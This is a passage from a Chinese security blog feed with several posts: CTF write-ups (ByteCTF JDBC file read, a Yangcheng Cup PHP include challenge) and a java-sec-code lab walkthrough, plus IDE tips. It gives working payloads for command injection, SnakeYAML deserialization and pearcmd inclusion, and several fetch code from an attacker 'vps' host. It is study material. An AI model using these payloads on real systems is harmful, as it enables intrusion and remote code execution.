[[source,users,ADMINISTRABLE_ROLE_AUTHORIZATIONS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_PRIVILEGES,COLUMN_STATISTICS,ENABLED_ROLES,ENGINES,EVENTS,FILES,INNODB_BUFFER_PAGE,INNODB_BUFFER_PAGE_LRU,INNODB_BUFFER_POOL_STATS,INNODB_CACHED_INDEXES,INNODB_CMP,INNODB_CMPMEM,INNODB_CMPMEM_RESET,INNODB_CMP_PER_INDEX,INNODB_CMP_PER_INDEX_RESET,INNODB_CMP_RESET,INNODB_COLUMNS,INNODB_DATAFILES,INNODB_FIELDS,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FT_BEING_DELETED,INNODB_FT_CONFIG,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_DELETED,INNODB_FT_INDEX_CACHE,INNODB_FT_INDEX_TABLE,INNODB_INDEXES,INNODB_METRICS,INNODB_SESSION_TEMP_TABLESPACES,INNODB_TABLES,INNODB_TABLESPACES,INNODB_TABLESPACES_BRIEF,INNODB_TABLESTATS,INNODB_TEMP_TABLE_INFO,INNODB_TRX,INNODB_VIRTUAL,KEYWORDS,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROLE_COLUMN_GRANTS,ROLE_ROUTINE_GRANTS,ROLE_TABLE]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> source;</span><br><span class="line"><span class="keyword">Result</span>: [[<span class="number">1</span>, <span class="number">1</span>, public mysql server, <span class="operator">-</span>, <span class="number">3306</span>, mysql, <span class="keyword">Running</span>, root, mySql_Super_Str0ng_paSSw0rb], [<span class="number">2</span>, <span class="number">1</span>, internal cache server, <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>, <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>, redis, <span class="keyword">Running</span>, <span class="operator">-</span>, redis_means_Remote_D1ctionary_Server]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> variables;</span><br><span class="line">...[secure_file_priv, <span class="operator">/</span>tmp<span class="operator">/</span>]...</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220926234948314.png" alt="image-20220926234948314"></p><p>connection test可以执行jdbc</p><p>使用用mysql fake server来读文件。需要修改一下 mysqlproto&#x2F;protocol&#x2F;handshake.py的72行<code>d[2]</code>改成<code>0x21</code> 否则报错</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220927003346984.png" alt="image-20220927003346984"></p><p>但是没有像WM战队的使用netdoc复现成功</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220927003601750.png" alt="image-20220927003601750"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=jdbc:mysql:<span class="comment">//ip:7007/jdbc?allowLoadLocalInfile=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true&amp;username=fileread_/very_Str4nge_NamE_of_flag&amp;password=5</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220927003137931.png" alt="image-20220927003137931"></p><p>参考链接：</p><ol><li><p><a href="https://blog.wm-team.cn/index.php/archives/28/">ByteCTF 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p></li><li><p>EDISEC战队的wp:<a href="https://mp.weixin.qq.com/s/kLmQLCCbByQ15LgGWeHk3g">https://mp.weixin.qq.com/s/kLmQLCCbByQ15LgGWeHk3g</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> bytectf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idea创建maven项目一直显示loading archetype list...解决方法</title>
      <link href="/2022/10/17/idea%E5%88%9B%E5%BB%BAmaven%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%9B%B4%E6%98%BE%E7%A4%BAloading-archetype-list-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2022/10/17/idea%E5%88%9B%E5%BB%BAmaven%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%9B%B4%E6%98%BE%E7%A4%BAloading-archetype-list-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>在使用idea创建maven项目时，想使用现有的模板<code>create from archetype</code>，但是一直加载不出来，显示<code>loading archetype list...</code></p><h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><p>对新建项目的设置进行修改</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151717260.png" alt="image-20221017151717260"></p><ol><li>第一步</li></ol><p><code>setting--&gt;Build,Execution,Deployment--&gt;Build Tools--&gt;Maven--&gt;importing</code></p><p>修改对应的<code>JDK for importer</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151536034.png" alt="image-20221017151536034"></p><ol start="2"><li>第二步</li></ol><p><code>setting--&gt;Build,Execution,Deployment--&gt;Build Tools--&gt;Maven--&gt;Runner</code></p><p>修改对应的jre</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151638418.png" alt="image-20221017151638418"></p><p>注意修改之后保存！！！</p><p>然后再次新建maven项目的时候就会显现出来</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017151831776.png" alt="image-20221017151831776"></p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://blog.csdn.net/pk694046220/article/details/80870313">(9条消息) Idea loading archetype list…_彭珂个人网的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-sec-code-cmdinject-rce</title>
      <link href="/2022/10/12/java-sec-code-cmdinject-rce/"/>
      <url>/2022/10/12/java-sec-code-cmdinject-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="java-sec-code"><a href="#java-sec-code" class="headerlink" title="java-sec-code"></a>java-sec-code</h1><p>[toc]</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>大致参考：<a href="https://www.freebuf.com/articles/web/289863.html">代码审计入门之java-sec-code（一） - FreeBuf网络安全行业门户</a></p><p>不同的地方，我使用的idea2021需要将src进行一下设置</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006234746411.png" alt="image-20221006234746411"></p><p>然后按照4步进行设置</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006234842950.png" alt="image-20221006234842950"></p><p>导入依赖花了一些时间</p><p>因为是在windows上运行，所以需要修改一部分代码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006235105851.png" alt="image-20221006235105851"></p><p>修改index.html</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221006235704040.png" alt="image-20221006235704040"></p><p>这个靶场包括java的很多漏洞</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132307190.png" alt="image-20221007132307190"></p><p>访问127.0.0.1:8080，账户密码 admin admin123</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132356964.png" alt="image-20221007132356964"></p><h2 id="CmdInject"><a href="#CmdInject" class="headerlink" title="CmdInject"></a>CmdInject</h2><p>命令注入</p><p>注意看url</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeinject?filepath=.%<span class="number">26</span>ipconfig</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007132558252.png" alt="image-20221007132558252"></p><p>查看源码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221007161257904.png" alt="image-20221007161257904"></p><h3 id="关于ProcessBuilder"><a href="#关于ProcessBuilder" class="headerlink" title="关于ProcessBuilder"></a>关于ProcessBuilder</h3><p><a href="https://blog.csdn.net/u013256816/article/details/54603910">(7条消息) 浅析ProcessBuilder_朱小厮的博客-CSDN博客_processbuilder</a></p><blockquote><p>ProcessBuilder类是J2SE 1.5在java.lang中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法</p><p>属性command</p><p>​是一个字符串列表，它表示要调用的外部程序文件及其参数（如果有）。在此，表示有效的操作系统命令的字符串列表是依赖于系统的。例如，每一个总体变量，通常都要成为此列表中的元素，但有一些操作系统，希望程序能自己标记命令行字符串——在这种系统中，Java 实现可能需要命令确切地包含这两个元素。(每次构造函数就是将里面的列表赋值给command)</p><p>属性redirectErrorStream</p><p>最初，此属性为 false，意思是子进程的标准输出和错误输出被发送给两个独立的流，这些流可以通过 Process.getInputStream() 和 Process.getErrorStream() 方法来访问。如果将值设置为 true，标准错误将与标准输出合并。这使得关联错误消息和相应的输出变得更容易。在此情况下，合并的数据可从 Process.getInputStream() 返回的流读取，而从 Process.getErrorStream() 返回的流读取将直接到达文件尾。<br>（在codeinject这里，将其设置为true，将标准输出和标准错误合并）</p></blockquote><p>ProcessBuilder类和Process类</p><blockquote><p>既然有Process类，那为什么还要发明个ProcessBuilder类呢？ProcessBuilder和Process两个类有什么区别呢？<br>原来，ProcessBuilder为进程提供了更多的控制，例如，可以设置当前工作目录，还可以改变环境参数。而Process的功能相对来说简单的多。<br>ProcessBuilder是一个final类，有两个带参数的构造方法，你可以通过构造方法来直接创建ProcessBuilder的对象。而Process是一个抽象类，一般都通过Runtime.exec()和ProcessBuilder.start()来间接创建其实例。</p></blockquote><p>启动一个默认工作工作目录和环境的新进程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg&quot;</span>).start();</span><br></pre></td></tr></table></figure><h3 id="codeinject-x2F-host"><a href="#codeinject-x2F-host" class="headerlink" title="codeinject&#x2F;host"></a>codeinject&#x2F;host</h3><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008082818494.png" alt="image-20221008082818494"></p><p>如果将Host直接设置为ip:port</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008083009131.png" alt="image-20221008083009131"></p><p>那么就会执行<code>curl ip:port</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008082924674.png" alt="image-20221008082924674"></p><p>但是如果是ip:port，那么就不能进行命令注入，所以一定要将端口号消去</p><h3 id="codeinject-x2F-sec"><a href="#codeinject-x2F-sec" class="headerlink" title="codeinject&#x2F;sec"></a>codeinject&#x2F;sec</h3><p>这里对传入的参数filepath进行了处理</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145226138.png" alt="image-20221008145226138"></p><p>跟进SecurityUtil.cmdFilter函数</p><p>如果匹配到除FILTER_PATTERN以外的字符，就返回null</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145303967.png" alt="image-20221008145303967"></p><p>查看<code>FILTER_PATTERN</code>，是大小写字母和数字</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145340125.png" alt="image-20221008145340125"></p><p>所以这里就将之前命令执行的特殊字符进行了过滤</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008145745292.png" alt="image-20221008145745292"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>算是了解多种java远程命令执行的方法</p><h3 id="runtime-x2F-rce"><a href="#runtime-x2F-rce" class="headerlink" title="runtime&#x2F;rce"></a>runtime&#x2F;rce</h3><p>直接是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>没有经过过滤</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150007111.png" alt="image-20221008150007111"></p><p>效果如下</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150048967.png" alt="image-20221008150048967"></p><p>但是要注意的地方是，直接从主页面点击RCE，不会到上面的路由下</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150120417.png" alt="image-20221008150120417"></p><p>而是会跳到别的地方<code>rce/exec?cmd=whoami</code>，不是正确的路由</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150155045.png" alt="image-20221008150155045"></p><h3 id="processbuilder"><a href="#processbuilder" class="headerlink" title="processbuilder"></a>processbuilder</h3><p>注意修改代码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150459385.png" alt="image-20221008150459385"></p><p>运行效果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008150609672.png" alt="image-20221008150609672"></p><p>具体代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] arrCmd = &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br></pre></td></tr></table></figure><h3 id="jscmd"><a href="#jscmd" class="headerlink" title="jscmd"></a>jscmd</h3><p>将zz.js放置在vps上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="title function_">mainOutput</span>(); <span class="keyword">function</span> <span class="title function_">mainOutput</span>(<span class="params"></span>) &#123; <span class="keyword">var</span> x=java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008224655107.png" alt="image-20221008224655107"></p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line"><span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">engine.eval(cmd, bindings);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/jscmd?jsurl=http:<span class="comment">//vps/zz.js</span></span><br></pre></td></tr></table></figure><h3 id="vuln-x2F-yarm"><a href="#vuln-x2F-yarm" class="headerlink" title="vuln&#x2F;yarm"></a>vuln&#x2F;yarm</h3><p>参考：<a href="https://www.freebuf.com/articles/web/338055.html">Java代码审计之RCE漏洞 - FreeBuf网络安全行业门户</a></p><p>利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意yml内容时会完成指定的动作。</p><p>攻击的流程：<code>先是触发java.net.URL去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现javax.script.ScriptEngineFactory接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞</code></p><p><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></p><p>下载下来，然后javac编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p>生成yaml-payload.jar</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221011234824781.png" alt="image-20221011234824781"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://vps/yaml-payload.jar&quot;]]]]</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://vps/yaml-payload.jar%22]]]]</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221012174852653.png" alt="image-20221012174852653"></p><h3 id="sec-x2F-yarm"><a href="#sec-x2F-yarm" class="headerlink" title="sec&#x2F;yarm"></a>sec&#x2F;yarm</h3><p>相比于上一个vuln&#x2F;yarm，这里使用的是SafeConstructor类</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221012175801301.png" alt="image-20221012175801301"></p><p>使用<code>new SafeConstructor()</code>即可防御Yaml反序列化</p><h3 id="groovy"><a href="#groovy" class="headerlink" title="groovy"></a>groovy</h3><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">groovyShell.evaluate(content);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/rce/groovy?content=%22calc%22.execute()</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008225020518.png" alt="image-20221008225020518"></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java-sec-code </tag>
            
            <tag> cmdinject </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用idea进行反编译</title>
      <link href="/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
      <url>/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h1 id="使用idea进行反编译"><a href="#使用idea进行反编译" class="headerlink" title="使用idea进行反编译"></a>使用idea进行反编译</h1><p>首先在idea中安装插件，这里我从marketplace中没找到，然后在installed中发现已经安装好了</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009082901210.png" alt="image-20221009082901210"></p><p>找到<code>java-decompiler.jar</code>存放的路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\software\IntelliJ IDEA <span class="number">2021.2</span><span class="number">.3</span>\plugins\java-decompiler\lib\java-decompiler.jar</span><br></pre></td></tr></table></figure><p>在需要反编译的jar包同目录下创建一个文件夹，用来存放反编译之后的文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009083158266.png" alt="image-20221009083158266"></p><p>在改目录下打开cmd(默认的java是java8)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;D:\software\IntelliJ IDEA 2021.2.3\plugins\java-decompiler\lib\java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> app.jar app</span><br></pre></td></tr></table></figure><p>但是会报错</p><blockquote><p>Error: A JNI error has occurred, please check your installation and try again<br>Exception in thread “main” java.lang.UnsupportedClassVersionError: org&#x2F;jetbrains&#x2F;java&#x2F;decompiler&#x2F;main&#x2F;decompiler&#x2F;ConsoleDecompiler has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0</p></blockquote><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009090102729.png" alt="image-20221009090102729"></p><p>这是因为jar包中的class文件的版本和本机的java版本不对应的缘故</p><p><strong>class文件版本跟jdk版本对应关系如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">49</span> = Java <span class="number">5</span></span><br><span class="line"><span class="number">50</span> = Java <span class="number">6</span></span><br><span class="line"><span class="number">51</span> = Java <span class="number">7</span></span><br><span class="line"><span class="number">52</span> = Java <span class="number">8</span></span><br><span class="line"><span class="number">53</span> = Java <span class="number">9</span></span><br><span class="line"><span class="number">54</span> = Java <span class="number">10</span></span><br><span class="line"><span class="number">55</span> = Java <span class="number">11</span></span><br><span class="line"><span class="number">56</span> = Java <span class="number">12</span></span><br><span class="line"><span class="number">57</span> = Java <span class="number">13</span></span><br><span class="line"><span class="number">58</span> = Java <span class="number">14</span></span><br><span class="line"><span class="number">59</span> = Java <span class="number">15</span></span><br><span class="line"><span class="number">60</span> = Java <span class="number">16</span></span><br></pre></td></tr></table></figure><p>所以根据报错，应该采用java11进行反编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\environment\java\jdk-<span class="number">11.0</span><span class="number">.2</span>\bin\java.exe -cp <span class="string">&quot;D:\software\IntelliJ IDEA 2021.2.3\plugins\java-decompiler\lib\java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> app.jar app</span><br></pre></td></tr></table></figure><p>运行成功</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009090324831.png" alt="image-20221009090324831"></p><p>最后在指定的文件夹下会出现一个已经编译好的jar包，进行解压查看即可</p><p>其中的源码已经反编译为java文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009090453102.png" alt="image-20221009090453102"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://blog.csdn.net/q863672107/article/details/124367310">(8条消息) 使用IDEA的反编译插件 反编译jar包&#x2F;class文件&#x2F;修改jar包_cy比昨天更好的博客-CSDN博客_idea反编译jar插件</a></li><li><a href="https://blog.csdn.net/Alexz__/article/details/108689610">(8条消息) 使用IntelliJ IDEA反编译Jar包_Alexz__的博客-CSDN博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> idea </tag>
            
            <tag> 反编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022羊城杯-Web</title>
      <link href="/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/"/>
      <url>/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h1><p>[toc]</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p>E:\markdown\CTF\2022比赛\0903羊城杯&gt;ciphey -t “ZMJTPM33ZEDJXZOMTOGQRZOETN4GPMOFZV4GPAGPZD2TRBYRZRMJXAOIZR2U2&#x3D;&#x3D;&#x3D;”<br>Possible plaintext: ‘flag{dae090f201091d2b916bd4b9da3e45a4}’ (y&#x2F;N): y<br>╭────────────────────────────────────────────────────────────╮<br>│ The plaintext is a Capture The Flag (CTF) Flag             │<br>│ Formats used:                                              │<br>│    caesar:                                                 │<br>│     Key: 13                                                │<br>│    base32                                                  │<br>│    utf8Plaintext: “flag{dae090f201091d2b916bd4b9da3e45a4}” │<br>╰────────────────────────────────────────────────────────────╯</p></blockquote><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过stristr：</p><p>添加回车符%0a绕过检测(记得要在回车符之前转义，不然htaccess会报错)，system函数内可以拼接字符串绕过</p><p>pearcmd.php文件包含，题目过滤了create和install，但是还能用download，并且对<code>$_SERVER[&quot;QUERY_STRING&quot;])</code>的过滤可以通过url编码绕过</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904082808666.png" alt="image-20220904082808666"></p><p>vps上整一个1.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">下载</span><br><span class="line">?file=/usr/local/lib/php/%<span class="number">70</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">72</span>cmd.php&amp;+download+http:<span class="comment">//vps:7002/1.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184350966.png" alt="image-20220903184350966"></p><p>文件包含成功，整一个一句话木马，放进2.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/%<span class="number">70</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">72</span>cmd.php&amp;+download+http:<span 